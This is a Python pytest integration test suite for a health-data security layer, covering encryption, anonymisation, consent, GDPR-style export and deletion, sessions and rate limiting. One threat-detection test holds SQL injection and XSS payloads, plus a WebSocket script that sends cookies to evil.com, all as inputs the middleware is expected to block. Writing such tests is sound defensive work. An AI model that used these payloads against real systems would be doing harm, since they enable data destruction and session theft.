# test_security_integration.py - Integration tests for complete security system
import pytest
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, patch

from src.security.encryption import get_encryption_service
from src.security.privacy import get_privacy_manager, DataCategory, AnonymizationLevel
from src.security.consent import get_consent_manager, ConsentType
from src.security.data_protection import get_data_protection_service
from src.security.transport_security import get_transport_security_manager
from src.security.security_middleware import SecurityMiddleware

class TestEndToEndSecurityWorkflow:
    """Test complete end-to-end security workflow"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.encryption_service = get_encryption_service()
        self.privacy_manager = get_privacy_manager()
        self.consent_manager = get_consent_manager()
        self.data_protection_service = get_data_protection_service()
        self.transport_manager = get_transport_security_manager()
        self.security_middleware = SecurityMiddleware()
    
    def test_complete_health_data_processing_workflow(self):
        """Test complete workflow for processing health data securely"""
        user_id = "health_workflow_user"
        client_ip = "192.168.1.100"
        user_agent = "Mozilla/5.0 (Test Browser)"
        
        # Step 1: Initialize transport security
        transport_init = self.transport_manager.initialize_https_security("test_cert")
        assert transport_init["initialized"]
        
        # Step 2: Create secure session
        session_result = self.security_middleware.create_secure_session(
            user_id, client_ip, user_agent
        )
        assert session_result["success"]
        session_id = session_result["session_id"]
        csrf_token = session_result["csrf_token"]
        
        # Step 3: Request and grant consents
        consent_request = self.consent_manager.create_consent_request(
            user_id, ["data_processing_consent", "health_data_consent", "biometric_data_consent"]
        )
        
        consent_responses = {
            "data_processing_consent": True,
            "health_data_consent": True,
            "biometric_data_consent": True
        }
        
        consent_result = self.consent_manager.process_consent_response(
            consent_request.request_id, consent_responses
        )
        assert consent_result["status"] == "success"
        
        # Step 4: Process health data with full security
        health_data = {
            "patient_name": "John Doe",
            "email": "john.doe@email.com",
            "phone": "555-123-4567",
            "age": 45,
            "diagnosis": "Type 2 Diabetes",
            "symptoms": "Frequent urination, excessive thirst",
            "blood_pressure": "140/90",
            "medication": "Metformin 500mg",
            "doctor_notes": "Patient shows good compliance with treatment plan"
        }
        
        # Validate session and CSRF token
        session_validation = self.security_middleware.session_manager.validate_session(
            session_id, client_ip, user_agent
        )
        assert session_validation["valid"]
        assert self.security_middleware.validate_csrf_token(session_id, csrf_token)
        
        # Process data request through security middleware
        request_data = {"data": health_data}
        processing_result = self.security_middleware.process_data_request(
            user_id, DataCategory.HEALTH_DATA, "health_assessment", request_data
        )
        
        assert processing_result["allowed"]
        assert "processed_data" in processing_result
        
        processed_data = processing_result["processed_data"]
        
        # Step 5: Verify security measures were applied
        # Personal identifiers should be anonymized
        assert processed_data["patient_name"] != "John Doe"
        assert processed_data["email"] != "john.doe@email.com"
        assert processed_data["phone"] != "555-123-4567"
        
        # Medical information should be preserved for accuracy
        assert processed_data["diagnosis"] == "Type 2 Diabetes"
        assert processed_data["symptoms"] == "Frequent urination, excessive thirst"
        assert processed_data["medication"] == "Metformin 500mg"
        
        # Step 6: Verify data is encrypted at rest
        user_encrypted_data = self.encryption_service.get_user_encrypted_data(user_id)
        assert len(user_encrypted_data) > 0
        
        # Step 7: Test data export (GDPR right to access)
        export_data = self.data_protection_service.export_user_data(user_id)
        assert export_data["user_id"] == user_id
        assert "consent_data" in export_data
        assert "privacy_data" in export_data
        assert "processing_logs" in export_data
        
        # Step 8: Test data deletion (GDPR right to be forgotten)
        deletion_result = self.data_protection_service.delete_user_data(user_id)
        assert deletion_result["status"] == "completed"
        
        # Verify all data is deleted
        export_after_deletion = self.data_protection_service.export_user_data(user_id)
        assert export_after_deletion["privacy_data"]["total_records"] == 0
        
        user_encrypted_data_after = self.encryption_service.get_user_encrypted_data(user_id)
        assert len(user_encrypted_data_after) == 0
    
    def test_security_threat_detection_and_response(self):
        """Test security threat detection and response workflow"""
        # Test 1: Rate limiting attack
        attacker_ip = "192.168.1.999"
        
        # Simulate rapid requests
        blocked_count = 0
        for i in range(15):
            request_data = {
                "client_ip": attacker_ip,
                "user_agent": "AttackBot/1.0",
                "input_data": {"request": f"attack_{i}"}
            }
            
            result = self.security_middleware.process_request(request_data)
            if not result["allowed"]:
                blocked_count += 1
        
        # Should block excessive requests
        assert blocked_count > 0
        
        # Test 2: SQL injection attempt
        sql_injection_request = {
            "client_ip": "192.168.1.888",
            "user_agent": "Mozilla/5.0",
            "input_data": {
                "query": "'; DROP TABLE users; --",
                "search": "1' OR '1'='1",
                "id": "1 UNION SELECT * FROM passwords"
            }
        }
        
        result = self.security_middleware.process_request(sql_injection_request)
        assert len(result["warnings"]) > 0  # Should detect SQL injection patterns
        
        # Test 3: XSS attempt
        xss_request = {
            "client_ip": "192.168.1.777",
            "user_agent": "Mozilla/5.0",
            "input_data": {
                "comment": "<script>alert('xss')</script>",
                "message": "javascript:alert('xss')",
                "content": "<img src=x onerror=alert('xss')>"
            }
        }
        
        result = self.security_middleware.process_request(xss_request)
        assert len(result["warnings"]) > 0  # Should detect XSS patterns
        
        # Test 4: WebSocket security threat
        # Initialize WebSocket connection
        ws_validation = self.transport_manager.websocket_manager.validate_websocket_connection(
            "192.168.1.666", "https://localhost", {}
        )
        connection_id = ws_validation["connection_id"]
        
        # Send malicious WebSocket message
        malicious_message = b"<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
        message_validation = self.transport_manager.websocket_manager.validate_websocket_message(
            connection_id, malicious_message, "text"
        )
        
        assert not message_validation["valid"]
        assert message_validation["reason"] == "security_threat_detected"
    
    def test_privacy_compliance_workflow(self):
        """Test privacy compliance workflow"""
        user_id = "privacy_compliance_user"
        
        # Step 1: Grant minimal necessary consents
        self.consent_manager.grant_consent(
            user_id, ConsentType.DATA_PROCESSING, "Basic data processing"
        )
        
        # Step 2: Process data with privacy protection
        personal_data = {
            "full_name": "Alice Johnson",
            "email": "alice.johnson@email.com",
            "phone": "(555) 987-6543",
            "ssn": "123-45-6789",
            "address": "123 Main St, Anytown, USA",
            "medical_condition": "Hypertension",
            "age": 35
        }
        
        processed_data = self.data_protection_service.process_data_securely(
            user_id, personal_data, DataCategory.PERSONAL_IDENTIFIER, "profile_creation"
        )
        
        # Step 3: Verify privacy protection measures
        # PII should be anonymized
        assert processed_data["full_name"] != "Alice Johnson"
        assert processed_data["email"] != "alice.johnson@email.com"
        assert processed_data["phone"] != "(555) 987-6543"
        assert processed_data["ssn"] != "123-45-6789"
        
        # Step 4: Test consent withdrawal
        withdrawal_success = self.consent_manager.withdraw_consent(
            user_id, ConsentType.DATA_PROCESSING
        )
        assert withdrawal_success
        
        # Step 5: Verify data processing is blocked after consent withdrawal
        with pytest.raises(ValueError, match="consent"):
            self.data_protection_service.process_data_securely(
                user_id, {"new_data": "test"}, DataCategory.PERSONAL_IDENTIFIER, "blocked_processing"
            )
        
        # Step 6: Test data retention compliance
        user_summary = self.privacy_manager.get_user_data_summary(user_id)
        assert user_summary["scheduled_deletions"] >= 0  # Should have retention policies
    
    def test_encryption_key_management_workflow(self):
        """Test encryption key management workflow"""
        # Step 1: Generate encryption keys
        symmetric_key = self.encryption_service.key_manager.generate_symmetric_key(
            "test_workflow_key", expires_in_days=30
        )
        assert symmetric_key.is_active
        
        asymmetric_key = self.encryption_service.key_manager.generate_asymmetric_key_pair(
            "test_workflow_keypair", expires_in_days=365
        )
        assert asymmetric_key.is_active
        
        # Step 2: Encrypt sensitive data
        sensitive_data = "Patient has diabetes and requires insulin treatment"
        
        # Symmetric encryption
        encrypted_symmetric = self.encryption_service.encrypt_data(
            sensitive_data, "test_workflow_key"
        )
        assert encrypted_symmetric.encrypted_content != sensitive_data.encode()
        
        # Asymmetric encryption
        encrypted_asymmetric = self.encryption_service.encrypt_data(
            sensitive_data, "test_workflow_keypair", 
            encryption_type=self.encryption_service.EncryptionType.ASYMMETRIC
        )
        assert encrypted_asymmetric.encrypted_content != sensitive_data.encode()
        
        # Step 3: Decrypt data
        decrypted_symmetric = self.encryption_service.decrypt_data(encrypted_symmetric)
        assert decrypted_symmetric.decode() == sensitive_data
        
        decrypted_asymmetric = self.encryption_service.decrypt_data(encrypted_asymmetric)
        assert decrypted_asymmetric.decode() == sensitive_data
        
        # Step 4: Test key rotation
        rotated_key = self.encryption_service.key_manager.rotate_key("test_workflow_key")
        assert rotated_key.is_active
        
        # Original key should be deactivated
        original_key_info = self.encryption_service.key_manager.get_key_info("test_workflow_key")
        assert not original_key_info.is_active
        
        # Step 5: Test key cleanup
        cleanup_count = self.encryption_service.key_manager.cleanup_expired_keys()
        assert cleanup_count >= 0
    
    def test_audit_and_compliance_reporting(self):
        """Test audit and compliance reporting"""
        user_id = "audit_test_user"
        
        # Step 1: Perform various security operations
        self.consent_manager.grant_consent(
            user_id, ConsentType.DATA_PROCESSING, "Audit testing"
        )
        self.consent_manager.grant_consent(
            user_id, ConsentType.HEALTH_DATA, "Health data audit testing"
        )
        
        # Process some data
        test_data = {
            "name": "Audit Test User",
            "condition": "Test condition for audit",
            "timestamp": datetime.now().isoformat()
        }
        
        self.data_protection_service.process_data_securely(
            user_id, test_data, DataCategory.HEALTH_DATA, "audit_testing"
        )
        
        # Step 2: Generate comprehensive audit report
        audit_report = self.data_protection_service.audit_data_protection()
        
        # Verify audit report completeness
        required_fields = [
            "audit_timestamp",
            "total_processing_activities",
            "activity_breakdown",
            "data_category_breakdown",
            "compliance_issues",
            "encryption_usage_rate",
            "consent_verification_rate"
        ]
        
        for field in required_fields:
            assert field in audit_report
        
        # Step 3: Test security status reporting
        security_status = self.security_middleware.get_security_status()
        
        assert "active_sessions" in security_status
        assert "rate_limited_ips" in security_status
        assert "security_headers_enabled" in security_status
        
        # Step 4: Test transport security status
        transport_status = self.transport_manager.get_transport_security_status()
        
        assert "https" in transport_status
        assert "websocket" in transport_status
        assert transport_status["https"]["certificates"] >= 0
        
        # Step 5: Test privacy manager status
        privacy_status = self.privacy_manager.get_privacy_status()
        
        assert privacy_status["total_privacy_rules"] > 0
        assert privacy_status["active_rules"] > 0
        assert len(privacy_status["data_categories_covered"]) > 0

class TestSecurityPerformanceAndScalability:
    """Test security system performance and scalability"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.security_middleware = SecurityMiddleware()
        self.encryption_service = get_encryption_service()
        self.privacy_manager = get_privacy_manager()
    
    def test_encryption_performance(self):
        """Test encryption performance with various data sizes"""
        test_data_sizes = [
            ("small", "Small test data"),
            ("medium", "Medium test data " * 100),
            ("large", "Large test data " * 1000)
        ]
        
        for size_name, test_data in test_data_sizes:
            start_time = time.time()
            
            # Encrypt data
            encrypted_data = self.encryption_service.encrypt_data(test_data)
            encryption_time = time.time() - start_time
            
            # Decrypt data
            start_time = time.time()
            decrypted_data = self.encryption_service.decrypt_data(encrypted_data)
            decryption_time = time.time() - start_time
            
            # Verify correctness
            assert decrypted_data.decode() == test_data
            
            # Performance should be reasonable (less than 1 second for test data)
            assert encryption_time < 1.0, f"Encryption too slow for {size_name} data: {encryption_time}s"
            assert decryption_time < 1.0, f"Decryption too slow for {size_name} data: {decryption_time}s"
    
    def test_concurrent_security_operations(self):
        """Test concurrent security operations"""
        import threading
        import queue
        
        results = queue.Queue()
        
        def security_operation(user_id):
            try:
                # Create session
                session_result = self.security_middleware.create_secure_session(
                    user_id, "192.168.1.100", "Mozilla/5.0"
                )
                
                # Process request
                request_data = {
                    "client_ip": "192.168.1.100",
                    "input_data": {"test": f"data_for_{user_id}"}
                }
                
                process_result = self.security_middleware.process_request(request_data)
                
                results.put({
                    "user_id": user_id,
                    "session_success": session_result["success"],
                    "request_allowed": process_result["allowed"],
                    "error": None
                })
            except Exception as e:
                results.put({
                    "user_id": user_id,
                    "error": str(e)
                })
        
        # Start multiple concurrent operations
        threads = []
        for i in range(10):
            user_id = f"concurrent_user_{i}"
            thread = threading.Thread(target=security_operation, args=(user_id,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Verify all operations completed successfully
        successful_operations = 0
        while not results.empty():
            result = results.get()
            if result.get("error") is None:
                assert result["session_success"]
                assert result["request_allowed"]
                successful_operations += 1
        
        assert successful_operations >= 8  # Allow for some rate limiting
    
    def test_privacy_anonymization_performance(self):
        """Test privacy anonymization performance"""
        # Test data with various PII types
        test_data = {
            "name": "John Smith",
            "email": "john.smith@email.com",
            "phone": "555-123-4567",
            "ssn": "123-45-6789",
            "address": "123 Main St, Anytown, USA 12345",
            "medical_history": "Patient has diabetes, hypertension, and heart disease. " * 10,
            "notes": "Long medical notes with patient information. " * 50
        }
        
        start_time = time.time()
        
        # Anonymize data
        anonymized_data = self.privacy_manager.process_data(
            "performance_test_user", test_data, DataCategory.HEALTH_DATA, "performance_testing"
        )
        
        anonymization_time = time.time() - start_time
        
        # Verify anonymization worked
        assert anonymized_data["name"] != "John Smith"
        assert anonymized_data["email"] != "john.smith@email.com"
        assert anonymized_data["phone"] != "555-123-4567"
        
        # Performance should be reasonable
        assert anonymization_time < 2.0, f"Anonymization too slow: {anonymization_time}s"
    
    def test_rate_limiting_scalability(self):
        """Test rate limiting scalability with many IPs"""
        rate_limiter = self.security_middleware.rate_limiter
        
        # Test with many different IPs
        start_time = time.time()
        
        for i in range(100):
            client_ip = f"192.168.1.{i}"
            
            # Each IP should be allowed initially
            is_limited = rate_limiter.is_rate_limited(client_ip, max_requests=5)
            assert not is_limited
        
        rate_limiting_time = time.time() - start_time
        
        # Should handle many IPs efficiently
        assert rate_limiting_time < 1.0, f"Rate limiting too slow for many IPs: {rate_limiting_time}s"

class TestSecurityEdgeCases:
    """Test security system edge cases and error handling"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.security_middleware = SecurityMiddleware()
        self.data_protection_service = get_data_protection_service()
        self.encryption_service = get_encryption_service()
    
    def test_malformed_data_handling(self):
        """Test handling of malformed or corrupted data"""
        # Test with None data
        request_data = {
            "client_ip": "192.168.1.100",
            "input_data": None
        }
        
        result = self.security_middleware.process_request(request_data)
        # Should handle gracefully without crashing
        assert "allowed" in result
        
        # Test with malformed JSON-like data
        request_data = {
            "client_ip": "192.168.1.100",
            "input_data": {"malformed": "data with \x00 null bytes"}
        }
        
        result = self.security_middleware.process_request(request_data)
        assert "allowed" in result
    
    def test_encryption_with_invalid_keys(self):
        """Test encryption behavior with invalid or missing keys"""
        # Test with non-existent key
        with pytest.raises(ValueError):
            self.encryption_service.encrypt_data("test data", "non_existent_key")
        
        # Test with expired key (simulate)
        expired_key = self.encryption_service.key_manager.generate_symmetric_key(
            "expired_key", expires_in_days=-1  # Already expired
        )
        
        # Should handle expired key gracefully
        try:
            encrypted_data = self.encryption_service.encrypt_data("test", "expired_key")
            # If it doesn't raise an exception, verify it still works
            decrypted = self.encryption_service.decrypt_data(encrypted_data)
            assert decrypted.decode() == "test"
        except ValueError:
            # Expected behavior for expired keys
            pass
    
    def test_consent_edge_cases(self):
        """Test consent management edge cases"""
        consent_manager = get_consent_manager()
        
        # Test consent for non-existent user
        user_consents = consent_manager.get_user_consents("non_existent_user")
        assert user_consents["total_consents"] == 0
        
        # Test withdrawing non-existent consent
        withdrawal_result = consent_manager.withdraw_consent(
            "test_user", ConsentType.MARKETING
        )
        assert not withdrawal_result  # Should return False for non-existent consent
        
        # Test expired consent request
        consent_request = consent_manager.create_consent_request(
            "test_user", ["data_processing_consent"], expires_in_hours=-1  # Already expired
        )
        
        with pytest.raises(ValueError, match="expired"):
            consent_manager.process_consent_response(
                consent_request.request_id, {"data_processing_consent": True}
            )
    
    def test_session_security_edge_cases(self):
        """Test session security edge cases"""
        user_id = "edge_case_user"
        client_ip = "192.168.1.100"
        user_agent = "Mozilla/5.0"
        
        # Create session
        session_result = self.security_middleware.create_secure_session(
            user_id, client_ip, user_agent
        )
        session_id = session_result["session_id"]
        
        # Test session validation with different IP
        validation = self.security_middleware.session_manager.validate_session(
            session_id, "192.168.1.200", user_agent  # Different IP
        )
        # Should detect IP mismatch
        assert not validation["valid"] or "ip_mismatch" in validation.get("warnings", [])
        
        # Test session validation with different user agent
        validation = self.security_middleware.session_manager.validate_session(
            session_id, client_ip, "Different User Agent"
        )
        # Should detect user agent mismatch
        assert not validation["valid"] or "user_agent_mismatch" in validation.get("warnings", [])
        
        # Test double logout
        logout1 = self.security_middleware.logout_user(session_id)
        logout2 = self.security_middleware.logout_user(session_id)
        
        assert logout1  # First logout should succeed
        assert not logout2  # Second logout should fail
    
    def test_data_protection_without_consent(self):
        """Test data protection behavior without proper consent"""
        user_id = "no_consent_user"
        
        # Try to process data without any consent
        test_data = {"name": "Test User", "email": "test@example.com"}
        
        with pytest.raises(ValueError, match="consent"):
            self.data_protection_service.process_data_securely(
                user_id, test_data, DataCategory.PERSONAL_IDENTIFIER, "unauthorized_processing"
            )
        
        # Grant partial consent and try to process data requiring more consent
        self.data_protection_service.consent_manager.grant_consent(
            user_id, ConsentType.DATA_PROCESSING, "Basic processing only"
        )
        
        # Try to process health data without health data consent
        health_data = {"diagnosis": "diabetes", "medication": "insulin"}
        
        with pytest.raises(ValueError, match="consent"):
            self.data_protection_service.process_data_securely(
                user_id, health_data, DataCategory.HEALTH_DATA, "health_analysis"
            )